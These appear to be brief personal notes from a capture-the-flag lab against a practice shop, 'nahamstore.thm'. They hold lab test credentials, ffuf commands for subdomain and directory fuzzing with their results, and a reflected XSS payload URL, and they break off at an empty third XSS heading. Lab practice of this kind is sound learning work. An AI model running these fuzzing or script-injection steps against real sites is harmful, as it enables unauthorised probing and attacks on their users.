___
test@test.com:testtest
# Recon

```bash
ffuf -w subdomains.txt -u http://nahamstore.thm -H "Host: FUZZ.nahamstore.thm"
```

- marketing
- shop
- stock
- www

```bash
ffuf -w content.txt -u http://nahamstore.thm/FUZZ
```

- basket
- css
- js
- login
- logout
- register
- returs
- robots.txt
- seach
- staff
- uploads

# XSS

## 1
```
http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(1)%3C/script%3E
```

## 2 

![[Pasted image 20241219130847.png]]

```
http://nahamstore.thm/account/orders/7
```

![[Pasted image 20241219130918.png]]

## 3


